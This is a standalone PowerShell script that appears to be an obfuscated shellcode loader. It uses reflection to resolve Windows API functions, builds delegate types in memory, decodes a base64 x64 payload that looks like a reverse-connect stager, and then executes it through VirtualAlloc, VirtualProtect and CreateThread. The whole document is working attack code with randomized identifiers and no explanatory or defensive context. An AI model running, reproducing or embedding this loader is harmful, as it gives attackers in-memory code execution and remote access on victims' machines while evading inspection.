function kRaR {
        Param ($ua, $sGP)
        $d_I = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $d_I.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($d_I.GetMethod('GetModuleHandle')).Invoke($null, @($ua)))), $sGP))
}

function pAtCG {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $r6,
                [Parameter(Position = 1)] [Type] $lKHca = [Void]
        )

        $lB9 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $lB9.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $r6).SetImplementationFlags('Runtime, Managed')
        $lB9.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $lKHca, $r6).SetImplementationFlags('Runtime, Managed')

        return $lB9.CreateType()
}

[Byte[]]$u9 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBIi1IYSItSIFFWSA+3SkpIi3JQTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8QVFIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBQi0gYSQHQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAEG6EsAfHkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$zhkv = 0
$momKi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kRaR kernel32.dll VirtualAlloc), (pAtCG @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $u9.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($u9, 0, $momKi, $u9.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kRaR kernel32.dll VirtualProtect), (pAtCG @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($momKi, [Uint32]$u9.Length, 0x10, [Ref]$zhkv)) -eq $true) {
        $gK = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kRaR kernel32.dll CreateThread), (pAtCG @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$momKi,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kRaR kernel32.dll WaitForSingleObject), (pAtCG @([IntPtr], [Int32]))).Invoke($gK,0xffffffff) | Out-Null
}
